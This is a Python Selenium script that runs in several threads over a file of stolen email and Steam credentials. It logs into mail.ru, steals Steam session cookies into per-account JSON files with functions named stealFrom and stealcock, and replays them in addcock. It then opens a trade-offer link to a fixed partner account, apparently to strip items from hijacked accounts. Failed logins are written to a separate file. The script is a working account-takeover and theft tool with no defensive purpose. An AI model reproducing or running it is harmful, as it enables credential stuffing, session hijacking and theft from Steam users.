from selenium.webdriver.common.by import By
from selenium.webdriver import Firefox
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import ElementNotInteractableException
import time, os, traceback
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as ec
import string
from random import *
from datetime import datetime
from selenium.webdriver.firefox.firefox_profile import FirefoxProfile
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
from threading import Thread
import logging
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import ElementClickInterceptedException
import re
from selenium.webdriver import ActionChains
import urllib.parse
import json
from addons.list_search import ListSearch


def loginIntoSteam(driver, wait, EmailNew, EmailNewPass, EmailOld, EmailOldPass):
    captcha = 0
    invalid = 0
    #captcha
    try:
        time.sleep(2)
        driver.find_element_by_css_selector('#captchaRefreshLink').click()
        captcha = 1
    except ElementNotInteractableException:
        captcha = 0
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.btn_blue_steamui'))).click()
    #invalid
    try:
        time.sleep(2)
        if driver.find_element_by_css_selector('#error_display').text == 'The account name or password that you have entered is incorrect.':
            invalid = 1
        else:
            invalid = 0
    except:
        pass

    if invalid == 1:
        f = open("invalidEmailS.txt", "a")
        data = str(EmailNew + ' ' + EmailNewPass + '         ' + EmailOld + ' ' + EmailOldPass.strip() + '\n')
        f.write(data)
        f.close()
        driver.close()
        driver.switch_to.window(driver.window_handles[0])
        driver.close()
    else:
        wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.user_avatar'))).click()


def stealFrom(driver, ID64, where):
    driver.get(where)
    file = str('kuki/' + ID64 + '.json')
    try:
        with open(file, mode='a') as f:
            for c in driver.get_cookies():
                f.write(json.dumps(c) + '\n')
    except:
        traceback.print_exc()


def stealcock(driver, ID64):
    stealFrom(driver, ID64, where='https://store.steampowered.com/account')
    stealFrom(driver, ID64, where='https://steamcommunity.com')
    stealFrom(driver, ID64, where='https://help.steampowered.com/en')


def Convert(string, delim):
    li = list(string.split(delim))
    return li


def addWhere(driver, ID64, where, dom):
    driver.get(where)
    file = str('kuki/' + ID64 + '.json')
    try:
        with open(file, mode='r') as f:
            for line in f:
                if dom in json.loads(line)['domain']:
                    driver.add_cookie(json.loads(line))
    except:
        traceback.print_exc()


def addcock(driver, ID64):
    addWhere(driver, ID64, where='https://store.steampowered.com/account', dom ='store.steampowered.com')
    addWhere(driver, ID64, where='https://steamcommunity.com', dom='steamcommunity.com')
    addWhere(driver, ID64, where='https://help.steampowered.com/en', dom='help.steampowered.com')
    acc = str('https://steamcommunity.com/profiles/' + ID64)
    #driver.get('https://steamcommunity.com/tradeoffer/new/?partner=1144106062&token=UoW5LyWe')
    driver.get('https://steamcommunity.com/tradeoffer/new/?partner=115936446&token=90IK0R4T') # ne_ya


def main(newLine, profile):
    arr = Convert(newLine, "	")
    options = Options()
    options.headless = True
    binary = FirefoxBinary("C:\\Program Files\\Mozilla Firefox\\firefox.exe")
    driver = webdriver.Firefox(firefox_profile=profile, firefox_binary=binary)
    wait = WebDriverWait(driver, 1800)
    ID64 =re.findall("\d+", arr[5])[0]
    driver.delete_all_cookies()
    driver.get('https://mail.ru/')
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.email-input'))).send_keys(arr[0])
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.button'))).click()
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.password-input'))).send_keys(arr[1])
    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.second-button'))).click()
    window_before = driver.window_handles[0]
    driver.switch_to.window(window_before)
    driver.execute_script("window.open('https://store.steampowered.com/login/', 'new window')")
    window_after = driver.window_handles[1]
    driver.switch_to.window(window_after)
    #wait.until(ec.element_to_be_clickable((By.XPATH, '//*[@id="input_username"]'))).send_keys(arr[2])
    #wait.until(ec.element_to_be_clickable((By.XPATH, '//*[@id="input_password"]'))).send_keys(arr[3])
    #loginIntoSteam(driver, wait, arr[0], arr[1], arr[10], arr[11])
    addcock(driver, ID64)
    #stealcock(driver, ID64)
    time.sleep(1)


if __name__ == '__main__':
    LOG_FILENAME = 'Loh.log'
    logging.basicConfig(filename=LOG_FILENAME, level=logging.INFO)
    ya = 1
    if ya == 1:
        frep = open('checker_cock.txt', 'r')
        #profile = FirefoxProfile("C:\\Users\\PussyDestroyer\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\7dvs7u3f.default")
        profile = FirefoxProfile("C:\\Users\\PussyDestroyer\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\dkhv3ari.cook")
    elif ya == 0:
        frep = open('checker_cock.txt', 'r')
        profile = FirefoxProfile("C:\\Users\\qweqweqwe\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\bmiwtt76.default")
    else:
        frep, profile = 0, 0
    Lines = frep.readlines()
    threads = []
    logging.info(str(datetime.now()) + ' starting...')
    for line in Lines:
        t = Thread(target=main, args=(line, profile,))
        time.sleep(1)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    input("Press Enter to continue...")